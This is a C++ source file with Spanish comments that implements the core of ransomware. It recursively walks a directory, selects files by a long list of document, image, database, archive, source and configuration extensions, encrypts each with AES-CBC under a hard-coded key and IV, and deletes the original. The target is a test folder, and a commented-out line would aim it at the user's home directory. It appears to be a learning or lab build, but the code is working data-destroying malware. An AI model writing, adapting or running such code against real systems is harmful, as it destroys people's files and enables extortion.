#include <iostream>
#include <filesystem>
#include <string>
#include <crypto++/aes.h>
#include <crypto++/modes.h>
#include <crypto++/filters.h>
#include <crypto++/files.h>

using namespace std;
namespace fs = std::filesystem;

int main() {
    string extensions[] = {".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".txt", ".3g2", ".vdw", ".xla", ".xlsm", ".vssm", ".dotm", ".m3u", ".ppsx",
    ".odt", ".ods", ".odp", ".rtf", ".csv",
    ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".tiff", ".tif", ".webp",
    ".ico", ".heic",
    ".mp3", ".wav", ".aac", ".ogg", ".flac", ".mp4", ".avi", ".mov",
    ".mkv", ".wmv", ".flv", ".webm", ".3gp",
    ".sql", ".db", ".mdb", ".sqlite", ".dbf",
    ".zip", ".rar", ".7z", ".tar", ".gz", ".bz2", ".xz",
    ".c", ".cpp", ".h", ".java", ".py", ".rb", ".js", ".php", ".html", ".css",
    ".sql", ".pl", ".sh", ".bat", ".ts", ".go", ".swift", ".r", ".scala",
    ".ini", ".cfg", ".conf", ".log", ".env", ".yaml", ".yml",
    ".plist", ".desktop", ".system",
    ".json", ".xml", ".yaml", ".yml", ".md", ".tex", ".nfo", ".epub",
    ".mobi", ".chm", ".iso", ".dmg", ".img", ".apk", ".bin",
    ".ai", ".eps", ".psd", ".indd", ".svg",
    ".key", ".odp", ".gdoc", ".gsheet", ".gslides"};

    // string user_home = getenv("HOME");
    
    // Tests
    string user_home = "directorio-test/";
    
    
    // Clave y vector de inicialización (IV) para AES (0123456789abcdef)
    CryptoPP::byte key[CryptoPP::AES::DEFAULT_KEYLENGTH] = {
        0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,
        0x38,0x39,0x61,0x62,0x63,0x64,0x65,0x66
    };

    CryptoPP::byte iv[CryptoPP::AES::BLOCKSIZE] = {
        0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37,
        0x38,0x39,0x61,0x62,0x63,0x64,0x65,0x66
    }; 

    for (const auto& entry : fs::recursive_directory_iterator(user_home)) {
        if (entry.is_regular_file()) {
            string ext = entry.path().extension().string();
            // Checar si el archivo ya está cifrado
            if (ext == ".enc") continue;

            for (const auto& allowed_ext : extensions) {
                if (ext == allowed_ext) {
                    try {
                        CryptoPP::CBC_Mode<CryptoPP::AES>::Encryption cbcEncryption(key, sizeof(key), iv);
                        CryptoPP::FileSource fs(entry.path().string().c_str(), true,
                            new CryptoPP::StreamTransformationFilter(cbcEncryption,
                            new CryptoPP::FileSink((entry.path().string() + ".enc").c_str())
                        ));
                        cout << "Encrypted: " << entry.path().string() << endl;

                        // Borra el archivo original solo si la encriptación fue exitosa
                        fs::remove(entry.path());

                    } catch (const CryptoPP::Exception& e) {
                        cerr << "Error encrypting file " << entry.path().string() << ": " << e.what() << endl;
                    }
                    break;
                }
            }
        }
    }

    return 0;
}